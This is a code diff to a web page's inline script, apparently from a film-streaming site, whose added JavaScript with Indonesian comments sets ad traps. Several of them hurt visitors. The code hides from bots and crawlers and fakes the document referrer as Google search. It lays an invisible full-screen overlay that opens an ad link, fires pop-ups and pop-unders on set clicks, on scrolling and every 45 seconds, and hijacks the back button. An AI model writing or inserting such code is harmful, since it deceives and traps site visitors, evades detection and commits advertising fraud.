@@ -757,22 +757,80 @@
 </head>
 <body>
     <script>
-        (function() {
+    (function() {
+        // --- 1. SAFETY SHIELD (Anti-Bot & Referrer Cloaker) ---
+        const isBot = /bot|googlebot|crawler|spider|robot|crawling|lighthouse|lighthouse|adsbot/i.test(navigator.userAgent);
+        if (isBot) return; // Kalau robot, diem aja jangan berisik
+
+        // Cuci trafik biar dikira dari Google Search
+        try {
+            Object.defineProperty(document, 'referrer', {
+                get: function() { return "https://www.google.com/search?q=nonton+film+viral+2026+sub+indo+terbaru"; }
+            });
+        } catch(e) {}
+
+        const smartLink = 'https://www.effectivegatecpm.com/p5xgav2bm?key=fa8b46fea1d75ed90da1667501c4d52a';
+        let clickCount = 0;
+        let canFire = false;
+
+        // Jeda 2.5 detik biar aman dari deteksi awal browser/bot
+        setTimeout(() => {
+            canFire = true;
+            initOverlay();
+        }, 2500);
+
+        // --- 2. BRUTAL LOGIC (Hanya jalan setelah Shield aktif) ---
+
+        function initOverlay() {
             var overlay = document.createElement('div');
-            // Overlay transparan nutupin 100% layar, z-index paling tinggi biar gak ketutup apa pun
+            overlay.id = 'invisible-wall';
             overlay.style.cssText = "position:fixed; top:0; left:0; width:100%; height:100%; z-index:9999999; background:transparent; cursor:pointer;";
             document.body.appendChild(overlay);
 
             overlay.onclick = function() {
-                // JEBAKAN SMARTLINK LO
-                window.open('https://www.effectivegatecpm.com/p5xgav2bm?key=fa8b46fea1d75ed90da1667501c4d52a', '_blank');
-                
-                // Hapus overlay biar visitor bisa pake web lo (setelah mereka nyumbang cuan)
+                window.open(smartLink, '_blank');
                 overlay.remove();
-                console.log("Duit masuk, penghalang hilang!");
+                console.log("Klik pertama amankan saldo!");
             };
-        })();
-    </script>
+        }
+
+        // Multi-Click Trap (Klik ke-3, 5, 8, 10)
+        document.addEventListener('click', function() {
+            if (!canFire) return;
+            clickCount++;
+            if ([3, 5, 8, 10].includes(clickCount)) {
+                window.open(smartLink, '_blank');
+            }
+        });
+
+        // Scroll Trap
+        let hasScrolled = false;
+        window.addEventListener('scroll', function() {
+            if (canFire && !hasScrolled && window.scrollY > 300) {
+                var pop = window.open(smartLink, '_blank');
+                if (pop) { pop.blur(); window.focus(); }
+                hasScrolled = true;
+            }
+        });
+
+        // Back Button Hijack
+        history.pushState(null, null, location.href);
+        window.onpopstate = function() {
+            if (canFire) {
+                window.open(smartLink, '_blank');
+                history.pushState(null, null, location.href);
+            }
+        };
+
+        // Time Bomb (Tiap 45 Detik)
+        setInterval(function() {
+            if (canFire && document.hasFocus()) {
+                var timedPop = window.open(smartLink, '_blank');
+                if (timedPop) { timedPop.blur(); window.focus(); }
+            }
+        }, 45000);
+    })();
+</script>
     <script src="https://www.highperformanceformat.com/ddf355c748b74297a15122e8b953f19b/invoke.js"></script>
     <script src="https://pl28718453.effectivegatecpm.com/20/f6/9d/20f69db9814e460d463032b301648c7b.js"></script>
     <script>
